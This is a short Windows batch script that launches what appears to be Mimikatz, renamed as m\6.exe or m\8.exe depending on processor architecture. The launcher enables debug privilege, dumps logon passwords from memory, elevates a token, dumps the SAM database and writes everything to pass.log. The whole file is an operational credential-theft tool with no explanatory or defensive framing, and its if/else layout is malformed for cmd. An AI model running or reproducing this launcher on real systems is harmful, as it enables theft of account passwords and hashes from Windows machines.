if %PROCESSOR_ARCHITECTURE%==AMD64 (
	m\6.exe "privilege::debug" "log .\pass.log" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
)
else
(
	m\8.exe "privilege::debug" "log .\pass.log" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
)
